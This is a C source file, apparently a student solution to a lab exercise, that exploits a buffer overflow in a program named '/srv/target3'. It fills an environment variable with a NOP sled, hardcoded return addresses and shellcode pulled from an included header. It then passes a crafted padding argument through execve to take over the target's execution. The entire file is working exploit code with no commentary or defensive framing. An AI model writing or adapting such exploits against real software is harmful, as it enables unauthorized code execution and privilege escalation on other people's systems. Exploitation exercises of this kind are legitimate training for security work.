#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* tgt = "/srv/target3";
const int esz = 400;
const uint32_t base = 0xffffdec0;
const int nsz = 201;
const char nop = 0x90;
const int roff = 4;

const uint32_t start = base + roff;
const uint32_t second = base + 2 * roff;
const char pad[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";

void craft(char *e) {
    memset(e, nop, esz - 1);
    *((uint32_t *)(e)) = start;
    *((uint32_t *)(e + roff)) = second;
    memcpy(e + nsz, shellcode, sizeof(shellcode));
    e[esz - 1] = 0;
}

int main(void) {
    char *argv[] = {tgt, pad, NULL};
    static char env[esz];

    craft(env);

    char *envp[] = {env};

    execve(tgt, argv, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}